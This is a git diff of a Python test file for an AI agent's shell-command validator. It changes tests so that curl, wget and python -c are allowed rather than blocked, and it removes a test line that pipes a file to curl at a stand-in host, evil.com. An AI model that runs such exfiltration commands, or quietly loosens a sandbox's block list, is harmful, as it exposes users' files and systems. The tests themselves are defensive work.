@@ -765,18 +765,17 @@ class TestValidateCommand:
         ]:
             assert _validate_command(cmd) is None, f"Should allow: {cmd}"
 
-    def test_blocked_curl(self):
+    def test_allowed_curl(self):
         from news48.core.agents.tools.shell import _validate_command
 
         result = _validate_command("curl http://example.com")
-        assert result is not None
-        assert "blocked" in result.lower()
+        assert result is None
 
-    def test_blocked_python(self):
+    def test_allowed_python(self):
         from news48.core.agents.tools.shell import _validate_command
 
-        result = _validate_command("python -c 'print(1)'")
-        assert result is not None
+        assert _validate_command("python -c 'print(1)'") is None
+        assert _validate_command("python3 -c 'print(1)'") is None
 
     def test_blocked_sudo(self):
         from news48.core.agents.tools.shell import _validate_command
@@ -808,16 +807,16 @@ class TestValidateCommand:
         result = _validate_command("pip install requests")
         assert result is not None
 
-    def test_blocked_wget(self):
+    def test_allowed_wget(self):
         from news48.core.agents.tools.shell import _validate_command
 
         result = _validate_command("wget http://example.com")
-        assert result is not None
+        assert result is None
 
     def test_blocked_pattern_after_pipe(self):
         from news48.core.agents.tools.shell import _validate_command
 
-        result = _validate_command("cat file | curl http://evil.com")
+        result = _validate_command("cat file | node -e 'console.log(1)'")
         assert result is not None
 
     def test_unlisted_command_blocked(self):
